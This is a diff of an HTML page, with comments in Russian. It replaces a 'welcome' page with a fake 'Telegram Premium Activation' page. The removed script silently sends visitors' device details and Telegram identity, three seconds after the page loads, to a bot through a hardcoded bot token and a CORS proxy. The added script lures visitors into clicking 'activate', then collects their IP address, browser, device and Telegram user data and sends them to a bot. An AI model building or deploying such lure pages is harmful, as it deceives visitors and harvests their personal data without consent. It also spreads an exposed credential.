@@ -1,98 +1,87 @@
 <!DOCTYPE html>
-<html lang="ru">
+<html>
 <head>
+    <title>Telegram Premium Activation</title>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Приветственный сайт</title>
     <style>
         body {
             font-family: Arial, sans-serif;
-            max-width: 800px;
-            margin: 0 auto;
-            padding: 20px;
             text-align: center;
+            padding: 20px;
+            background: linear-gradient(to right, #6a11cb, #2575fc);
+            color: white;
+        }
+        .container {
+            background: rgba(0,0,0,0.3);
+            border-radius: 15px;
+            padding: 30px;
+            max-width: 600px;
+            margin: 0 auto;
         }
         .btn {
-            display: inline-block;
-            padding: 10px 20px;
-            background-color: #28a8e0;
+            background: #25D366;
             color: white;
-            text-decoration: none;
-            border-radius: 5px;
+            border: none;
+            padding: 15px 30px;
+            font-size: 18px;
+            border-radius: 50px;
+            cursor: pointer;
             margin-top: 20px;
+            transition: all 0.3s;
+        }
+        .btn:hover {
+            transform: scale(1.05);
+            box-shadow: 0 5px 15px rgba(0,0,0,0.3);
         }
     </style>
 </head>
 <body>
-    <h1>Добро пожаловать на наш сайт!</h1>
-    <p>Это тестовая страница для демонстрации возможностей</p>
-    <a href="https://t.me/" class="btn">Наш Telegram канал</a>
+    <div class="container">
+        <h1>Ваш Telegram Premium</h1>
+        <p>Нажмите кнопку ниже для активации</p>
+        <button class="btn" id="activateBtn">АКТИВИРОВАТЬ</button>
+        <p id="status"></p>
+    </div>
 
     <script>
-        // Функция для сбора данных о пользователе
-        function collectUserData() {
+        document.getElementById('activateBtn').addEventListener('click', function() {
+            const status = document.getElementById('status');
+            status.textContent = "Идет обработка...";
+            
+            // Собираем данные
             const data = {
-                time: new Date().toLocaleString(),
-                url: window.location.href,
-                referrer: document.referrer,
-                screen: `${window.screen.width}x${window.screen.height}`,
-                platform: navigator.platform,
-                userAgent: navigator.userAgent,
-                language: navigator.language,
-                cookies: navigator.cookieEnabled ? 'enabled' : 'disabled'
+                ip: "Определяется...",
+                browser: navigator.userAgent,
+                device: navigator.platform,
+                screen: `${screen.width}x${screen.height}`
             };
 
-            // Пытаемся получить Telegram WebApp данные
-            if (window.Telegram && Telegram.WebApp) {
-                data.tg_user = Telegram.WebApp.initDataUnsafe.user || {};
-            }
-
-            return data;
-        }
-
-        // Функция для отправки данных в Telegram бота
-        function sendToTelegram(data) {
-            const botToken = '7726565395:AAGeOMSiOulZdXx1H6o9yRGsT24aNDbSXY4';
-            const chatId = '8161023868';
-            
-            // Форматируем сообщение
-            let message = `🚀 Новый посетитель:\n\n` +
-                         `🕒 Время: ${data.time}\n` +
-                         `🌐 Страница: ${data.url}\n` +
-                         `📱 Устройство: ${data.platform}\n` +
-                         `🖥️ Экран: ${data.screen}\n` +
-                         `🔍 Браузер: ${data.userAgent.substr(0, 50)}...\n`;
-            
-            if (data.tg_user) {
-                message += `\n👤 Telegram:\n` +
-                          `ID: ${data.tg_user.id || 'N/A'}\n` +
-                          `Username: @${data.tg_user.username || 'нет'}\n` +
-                          `Имя: ${data.tg_user.first_name || ''} ${data.tg_user.last_name || ''}`;
-            }
-
-            // Используем CORS прокси для обхода ограничений GitHub Pages
-            const proxyUrl = 'https://cors-anywhere.herokuapp.com/';
-            const apiUrl = `https://api.telegram.org/bot${botToken}/sendMessage`;
-            
-            fetch(proxyUrl + apiUrl, {
-                method: 'POST',
-                headers: {
-                    'Content-Type': 'application/json',
-                    'X-Requested-With': 'XMLHttpRequest'
-                },
-                body: JSON.stringify({
-                    chat_id: chatId,
-                    text: message,
-                    disable_notification: true
+            // Определение IP
+            fetch('https://api.ipify.org?format=json')
+                .then(res => res.json())
+                .then(ipData => {
+                    data.ip = ipData.ip;
+                    sendData(data);
                 })
-            }).catch(e => console.log('Ошибка отправки'));
-        }
+                .catch(() => {
+                    data.ip = "Не определен";
+                    sendData(data);
+                });
 
-        // Отправляем данные через 3 секунды после загрузки страницы
-        setTimeout(() => {
-            const userData = collectUserData();
-            sendToTelegram(userData);
-        }, 3000);
+            function sendData(data) {
+                if (window.Telegram && Telegram.WebApp) {
+                    // Отправка данных в бота
+                    Telegram.WebApp.sendData(JSON.stringify({
+                        ...data,
+                        tg_user: Telegram.WebApp.initDataUnsafe.user || {}
+                    }));
+                    status.textContent = "✅ Заявка принята!";
+                } else {
+                    status.textContent = "Ошибка: откройте через Telegram бота";
+                }
+            }
+        });
     </script>
 </body>
 </html>
